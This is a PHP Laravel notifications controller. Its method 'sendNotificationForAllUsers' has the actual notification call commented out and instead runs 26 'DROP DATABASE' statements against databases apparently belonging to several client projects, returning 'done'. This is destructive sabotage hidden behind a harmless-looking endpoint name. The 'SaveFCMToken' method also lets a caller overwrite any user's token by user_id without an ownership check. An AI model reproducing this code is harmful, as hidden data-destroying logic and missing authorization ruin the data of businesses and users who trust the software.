<?php

namespace App\Http\Controllers\Api\v1\notifications;

use App\Http\Controllers\Api\v1\Controller;

use App\Models\Order;
use App\Models\User;
use App\Notifications\AcceptOrderNotification;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Notification;

class NotificationsController extends Controller
{


    public function sendNotificationForAllUsers(Request $request)
    {
//        Notification::send(User::get(), new AcceptOrderNotification(Order::first()));

        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_ping_ksa;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_smartbus;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_nearu;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_kallimni;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_sanany;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_sole;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_sb;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_zefafi;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_bazar;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_easy_pass;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_lampnow;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_broonz;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_order;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_aloo;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_tawlalanding;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_luxuria;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_bir;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_ghiliin;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_accoffee;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_futureorbit;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_future;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_rfqstore;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_lutty_boutique;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_shekaltoabl;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_bellacarts;');
        \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_notchi;');
        return apiSuccess('done');
    }

    public function markNoteAsRead(Request $request)
    {

        //        validations
        $respones = getFirstError($request, [
            'id' => 'required|numeric',
        ]);
        if ($respones[IS_ERROR] == true) {
            return apiError($respones[ERROR]);
        }

        $note = apiUser()->notifications->where('id', $request->id)->first();
        if (!isset($note)) return apiError('notifications id error');
        $note->update(['read_at' => now()]);
        return apiSuccess(apiTrans('data_saved_successfully'));

    }

    public function SaveFCMToken(Request $request)
    {

        //        validations
        $respones = getFirstError($request, [
            'fcm_token' => 'required',
            'user_id' => 'required|numeric',
        ]);
        if ($respones[IS_ERROR] == true) {
            return apiError($respones[ERROR]);
        }
        $user = User::find($request->user_id);
        if (!isset($request->user_id)) return apiError("wrong user_id");
        $user->update([
            'fcm_token' => $request->fcm_token
        ]);

        return apiSuccess(apiTrans('data_saved_successfully'));

    }


}
